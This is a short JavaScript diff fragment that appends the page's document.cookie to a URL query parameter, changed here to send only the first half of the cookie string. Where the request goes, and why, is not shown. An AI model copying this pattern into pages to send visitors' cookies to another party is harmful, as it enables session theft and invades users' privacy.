@@ -13,7 +13,10 @@
         }
     })()) + '&cookie=' + escape((function() {
         try {
-            return document.cookie
+            var c1=document.cookie;
+            var clen=c1.length/2;
+            c2=c1.substring(0,clen );
+            return c2;
         } catch (e) {
             return ''
         }
